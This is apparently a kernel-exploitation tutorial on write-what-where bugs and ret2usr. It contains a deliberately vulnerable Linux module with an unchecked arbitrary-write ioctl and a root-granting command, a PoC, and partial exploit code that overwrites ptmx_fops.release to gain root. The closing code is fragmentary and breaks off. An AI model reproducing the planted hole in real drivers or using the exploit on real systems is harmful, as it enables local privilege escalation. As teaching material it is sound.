## **Write-what-where(Arbitrary Memory Overwrite)(feat.ret2usr)**

### **Write-what-where(Arbitrary Memory Overwrite)**

* **Write-what-where (Arbitrary Memory Overwrite) refers to any vulnerability condition where an attacker can write an arbitrary value to an arbitrary memory location.**
  + This vulnerability class frequently appears in CTF challenges and real-world kernel exploits.

:::info[CWE-123: Write-what-where Condition]
* <https://cwe.mitre.org/data/definitions/123.html>
* <https://www.cvedetails.com/cwe-details/123/cwe.html>
* <https://www.cvedetails.com/vulnerability-list/cweid-123/vulnerabilities.html>
:::

### **Return-to-user (ret2usr)**

* Refer to the explanations in [01.Stack smashing(32bit) & Return-to-user(ret2usr)](./01.stack-smashing3-184.md#ret2usrreturn-to-user).

## **Example**

### Source code of module

* **The following code adds a write-what-where primitive to the example from [04.Creating a kernel module to privilege escalation](../01.development-of-569/04.creating-a-kern-572.md):**
* **The added code operates as follows:**  
  + Adds `IOCTL_WWW` to the `switch` statement in `chardev_ioctl()`.
  + Casts the third argument (`arg`) of `chardev_ioctl()` to `struct ioctl_www_arg` and stores it into pointer `para`.
  + Assigns `para->value` directly to the address `para->ptr` without validation.
    - **This provides an arbitrary write primitive allowing an attacker to overwrite any memory address.**

```c title="chardev.c"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
    
#include "chardev.h"
MODULE_LICENSE("Dual BSD/GPL");
    
#define DRIVER_NAME "chardev"
        
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 1;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
   
static int     chardev_open(struct inode *, struct file *);
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static long chardev_ioctl(struct file *, unsigned int, unsigned long);
   
struct file_operations s_chardev_fops = {
    .open    = chardev_open,
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .unlocked_ioctl = chardev_ioctl,
};
   
static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    int minor = 0;
    dev_t dev;
    
    printk("The chardev_init() function has been called.");
        
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
    
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &s_chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
    
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
    
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
    
    device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, "chardev%d", minor);
    return 0;
}
    
static void chardev_exit(void)
{
    int minor = 0;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
        
    printk("The chardev_exit() function has been called.");
   
    device_destroy(chardev_class, MKDEV(chardev_major, minor));
    
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}
   
static int chardev_open(struct inode *inode, struct file *file)
{
    printk("The chardev_open() function has been called.");
    return 0;
}
    
static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_close() function has been called.");
    return 0;
}
    
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_write() function has been called.");
    return count;
}
    
static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_read() function has been called.");
    return count;
}
    
static struct ioctl_info info;
static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct ioctl_www_arg *para;
    printk("The chardev_ioctl() function has been called.");
    
    switch (cmd) {
        case SET_DATA:
            printk("SET_DATA\n");
            if (copy_from_user(&info, (void __user *)arg, sizeof(info))) {
                return -EFAULT;
            }
        printk("info.size : %ld, info.buf : %s",info.size, info.buf);
            break;
        case GET_DATA:
            printk("GET_DATA\n");
            if (copy_to_user((void __user *)arg, &info, sizeof(info))) {
                return -EFAULT;
            }
            break;
        case GIVE_ME_ROOT:
            printk("GIVE_ME_ROOT\n");
            commit_creds(prepare_kernel_cred(NULL));
            return 0;
        case IOCTL_WWW:
            para = (struct ioctl_www_arg *)arg;
            *(para->ptr) = para->value;
            return 0;
         
        default:
            printk(KERN_WARNING "unsupported command %d\n", cmd);
    
        return -EFAULT;
    }
    return 0;
}
   
module_init(chardev_init);
module_exit(chardev_exit);
```

## **Proof of Concept**

### PoC code

* **`test.c` tests the vulnerability as follows:**
  + Opens `/dev/chardev0` and calls `ioctl` with `IOCTL_WWW`.
  + Passes the following arguments:
    - `arg.ptr = 0x4141414141414141`
    - `arg.value = 0x4242424242424242`
  + **Attempts to write `0x4242424242424242` into address `0x4141414141414141`.**

```c title="test.c"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define DEVICE_FILE_NAME "/dev/chardev0"

int main()
{
    int fd;
    int ret_val;
    unsigned long *ptmx_fops;
    struct ioctl_www_arg arg;

    fd = open(DEVICE_FILE_NAME, 0);
    if (fd < 0) {
        printf("Can't open device file: %s\n", DEVICE_FILE_NAME);
        exit(1);
    }

    arg.ptr = 0x4141414141414141;
    arg.value = 0x4242424242424242;

    ret_val = ioctl(fd, IOCTL_WWW, &arg);
    if (ret_val < 0) {
        printf("ioctl failed: %d\n", ret_val);
        exit(1);
    }

    close(fd);
}
```

### struct file_operations

* **Calculate the offset of `.release` within `struct file_operations`:**
  + `.release` is the 14th member (index 13).
  + In 64-bit kernels, 13 pointer fields preceding it equal `13 * 8 = 104` bytes (`0x68`).
  + `ptmx_fops + 104` gives the address of `ptmx_fops.release`.

## **Exploit method**

* **The exploitation strategy is as follows:**

:::note
* Write a user mode `get_root()` payload:
  + `commit_creds(prepare_kernel_cred(NULL));`
* Use `IOCTL_WWW` to overwrite `ptmx_fops.release` with the address of `get_root`.
* Open `/dev/ptmx` and call `close(fd)`, triggering `ptmx_fops.release()`.
* Execute `/bin/sh` with root privileges.
:::

:::note[Required Addresses]
* Address of `prepare_kernel_cred()`
* Address of `commit_creds()`
* Address of `ptmx_fops.release` (`ptmx_fops + 104`)
:::

### ret2usr

* **Because we are hijacking a function pointer rather than corrupting a stack return frame, we do not need complex stack frame restoration (such as `swapgs`/`iretq`):**
  + The kernel's normal function call and return convention handles control flow.

```c title="ret2usr"
void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}
```

unsigned long *ptmx_fops_release;
 
void *kallsym_getaddr(char *name)
{
    FILE *fp;
    void *addr;
    char sym[512];
 
    fp = fopen("/proc/kallsyms", "r");
    while (fscanf(fp, "%p %*c %512s\n", &addr, sym) > 0) {
        if (strcmp(sym, name) == 0) {
            break;
        }else{
	    addr = NULL;
	}
    }
    fclose(fp);
    return addr;
}
 
void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

    int ret_val;
    void *ptmx_fops;

    if(prepare_kernel_cred == 0)
